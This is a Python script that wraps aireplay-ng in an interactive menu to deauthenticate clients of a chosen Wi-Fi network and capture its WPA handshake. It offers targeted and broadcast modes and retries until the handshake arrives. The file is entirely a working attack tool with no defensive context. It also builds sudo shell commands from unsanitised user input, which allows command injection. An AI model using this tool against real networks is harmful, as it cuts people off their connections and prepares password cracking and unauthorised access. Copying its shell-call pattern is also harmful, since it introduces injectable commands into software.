#! /usr/bin/python3

import os
import click
import time

os.system ("sudo clear")

def menu():

	os.system ('sudo clear')

	print ("""
$#################################$
#               MENU              #  
#                                 #
# 1) Specific Attack              #
#                                 #
# 2) General Attack (Recommended) #
#                                 #
# 3) I already have the handshake #_____
#PS:Just type the number of the option#|
$#################################$""")




os.system ("clear")

print ("""
=--------------------------=
|Deauthenticating clients|
=--------------------------=""")

print ("""\n
=**********************************=
* Type target's MAC address *
=**********************************=""")
bssid = input ("\n>> ")

print ("""\n
=*************************************=
* Type target network's name. *
=*************************************=""")
essid = input ("\n>> ")

print ("""\n
=*****************************************=
* Type your network adapter name in monitor mode. (Most likely: wlan0mon, wlo1mon) *
=*****************************************=""")
targetaM = input ("\n>> ")

while True:

	menu()

	opc = click.getchar()
	os.system ('clear')

	if opc == "1":

		print ("""\n
=*********************************************************=
* Type the MAC Address of any user connected to the target network. *
=*********************************************************=""")

		station = input ("\n>> ")

		comando1 = ("sudo aireplay-ng -0 10 -a '%s' -c '%s' %s" % (bssid, station, targetaM))

		os.system (comando1)
		os.system ('clear')

		print ("Did you get the handshake?")

		print ("""\n
$############$
#            #
# 1 ) Yes    #
#            #
# 2 ) No     #
#            #
# 3 ) Menu   #
#            #
$############$\n""")

		opc1 = click.getchar()

		while True:

			if opc1 == "1":
				quit()

			elif opc1 == "2":

				print ("*** Retrying... ***")
				os.system ('clear')
				os.system (comando1)
				os.system ("clear")
				print ("*** Please wait ***")
				time.sleep (2)
				os.system ('clear')
				print ("Did you get the handshake?\n")
				
				print ("""\n
$############$
#            #
# 1 ) Yes    #
#            #
# 2 ) No     #
#            #
# 3 ) Menu   #
#            #
$############$\n""")

				opc1 = click.getchar()

			elif opc1 == "3":
				break

			else:
				print ("*** Option not available ***")
				os.system ('clear')

	elif opc == "2":

		comando2 = ("sudo aireplay-ng -0 10 -a %s -e %s %s" % (bssid, essid, targetaM))

		os.system (comando2)
		time.sleep (1)
		os.system ('clear')

	elif opc == "3":

		os.system ("clear")
		quit()

	else:

		print ("*** Option not available***")
		time.sleep (2)
